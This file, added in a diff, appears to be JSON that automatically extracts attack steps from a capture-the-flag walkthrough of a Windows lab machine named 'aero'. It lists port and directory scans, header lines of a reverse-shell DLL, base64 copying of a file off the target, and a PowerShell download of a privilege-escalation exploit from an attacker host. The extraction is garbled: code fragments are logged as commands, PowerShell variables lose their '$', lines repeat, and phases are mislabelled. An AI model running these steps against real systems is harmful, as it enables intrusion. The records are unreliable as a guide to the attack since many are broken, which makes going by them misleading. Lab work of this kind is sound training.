@@ -1,0 +1,350 @@
+{
+  "target_ip": "10.10.11.237",
+  "os": "windows",
+  "steps": [
+    {
+      "phase": "recon",
+      "section": "nmap",
+      "command": "nmap -p- --min-rate 10000 10.10.11.237",
+      "action": "nmap_full",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "recon",
+      "section": "nmap",
+      "command": "nmap -p 80 -sCV 10.10.11.237",
+      "action": "nmap_scripts",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "foothold",
+      "section": "Directory Brute Force",
+      "command": "feroxbuster -u http://10.10.11.237 -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt",
+      "action": "feroxbuster",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "foothold",
+      "section": "POC",
+      "command": "find . -type f -exec file {} \\;",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "foothold",
+      "section": "Create Dummy DLL With Exports",
+      "command": "pragma once",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "foothold",
+      "section": "Create Dummy DLL With Exports",
+      "command": "include \"pch.h\"",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "foothold",
+      "section": "Create Dummy DLL With Exports",
+      "command": "include <Windows.h>",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "foothold",
+      "section": "Create Dummy DLL With Exports",
+      "command": "include \"rev.h\"",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "foothold",
+      "section": "Add Reverse Shell",
+      "command": "include \"pch.h\"",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "foothold",
+      "section": "Add Reverse Shell",
+      "command": "include <stdio.h>",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "foothold",
+      "section": "Add Reverse Shell",
+      "command": "include <string.h>",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "foothold",
+      "section": "Add Reverse Shell",
+      "command": "include <process.h>",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "foothold",
+      "section": "Add Reverse Shell",
+      "command": "include <winsock2.h>",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "foothold",
+      "section": "Add Reverse Shell",
+      "command": "include <ws2tcpip.h>",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "foothold",
+      "section": "Add Reverse Shell",
+      "command": "include <stdlib.h>",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "foothold",
+      "section": "Add Reverse Shell",
+      "command": "pragma comment(lib, \"Ws2_32.lib\")",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "foothold",
+      "section": "Add Reverse Shell",
+      "command": "include \"rev.h\"",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "user",
+      "section": "Documents",
+      "command": "powershell",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "user",
+      "section": "Documents",
+      "command": "cd ..\\Documents",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "user",
+      "section": "Documents",
+      "command": "[convert]::ToBase64String((Get-Content -path \"CVE-2023-28252_Summary.pdf\" -Encoding byte))",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "user",
+      "section": "Documents",
+      "command": "echo \"JVBERi...[snip]...GCg==\" | base64 -d > CVE-2023-28252_Summary.pdf",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "user",
+      "section": "Upload",
+      "command": "iwr http://10.10.14.6/clfs_eop.exe -outfile clfs_eop.exe",
+      "action": "unknown",
+      "target_ip": "10.10.14.6"
+    },
+    {
+      "phase": "user",
+      "section": "Execute",
+      "command": ".\\c.exe",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "user",
+      "section": "Execute",
+      "command": "< CLIXML",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "user",
+      "section": "Execute",
+      "command": "type root.txt",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "privesc",
+      "section": "Beyond Root - watchdog.ps1",
+      "command": "theme_watchdog = New-Object System.IO.FileSystemWatcher",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "privesc",
+      "section": "Beyond Root - watchdog.ps1",
+      "command": "theme_watchdog.Path = $directory",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "privesc",
+      "section": "Beyond Root - watchdog.ps1",
+      "command": "theme_watchdog.Filter = \"*.theme\"",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "privesc",
+      "section": "Beyond Root - watchdog.ps1",
+      "command": "theme_watchdog.IncludeSubdirectories = $false",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "privesc",
+      "section": "Beyond Root - watchdog.ps1",
+      "command": "theme_watchdog.EnableRaisingEvents = $true",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "privesc",
+      "section": "Beyond Root - watchdog.ps1",
+      "command": "directory",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "privesc",
+      "section": "Beyond Root - watchdog.ps1",
+      "command": "theme_watchdog",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "privesc",
+      "section": "Beyond Root - watchdog.ps1",
+      "command": "action",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "privesc",
+      "section": "Beyond Root - watchdog.ps1",
+      "command": "action = {",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "privesc",
+      "section": "Beyond Root - watchdog.ps1",
+      "command": "path = $Event.SourceEventArgs.FullPath",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "privesc",
+      "section": "Beyond Root - watchdog.ps1",
+      "command": "directory = \"C:\\inetpub\\aero\\uploads\"",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "privesc",
+      "section": "Beyond Root - watchdog.ps1",
+      "command": "action = {",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "privesc",
+      "section": "Beyond Root - watchdog.ps1",
+      "command": "path = $Event.SourceEventArgs.FullPath",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "privesc",
+      "section": "Beyond Root - watchdog.ps1",
+      "command": "theme_watchdog = New-Object System.IO.FileSystemWatcher",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "privesc",
+      "section": "Beyond Root - watchdog.ps1",
+      "command": "theme_watchdog.Path = $directory",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "privesc",
+      "section": "Beyond Root - watchdog.ps1",
+      "command": "theme_watchdog.Filter = \"*.theme\"",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "privesc",
+      "section": "Beyond Root - watchdog.ps1",
+      "command": "theme_watchdog.IncludeSubdirectories = $false",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "privesc",
+      "section": "Beyond Root - watchdog.ps1",
+      "command": "theme_watchdog.EnableRaisingEvents = $true",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "privesc",
+      "section": "Beyond Root - watchdog.ps1",
+      "command": "themepack_watchdog = New-Object System.IO.FileSystemWatcher",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "privesc",
+      "section": "Beyond Root - watchdog.ps1",
+      "command": "themepack_watchdog.Path = $directory",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "privesc",
+      "section": "Beyond Root - watchdog.ps1",
+      "command": "themepack_watchdog.Filter = \"*.themepack\"",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "privesc",
+      "section": "Beyond Root - watchdog.ps1",
+      "command": "themepack_watchdog.IncludeSubdirectories = $false",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    },
+    {
+      "phase": "privesc",
+      "section": "Beyond Root - watchdog.ps1",
+      "command": "themepack_watchdog.EnableRaisingEvents = $true",
+      "action": "unknown",
+      "target_ip": "10.10.11.237"
+    }
+  ],
+  "total_commands": 48,
+  "actions_used": [
+    "unknown",
+    "nmap_scripts",
+    "feroxbuster",
+    "nmap_full"
+  ],
+  "box_name": "aero"
+}
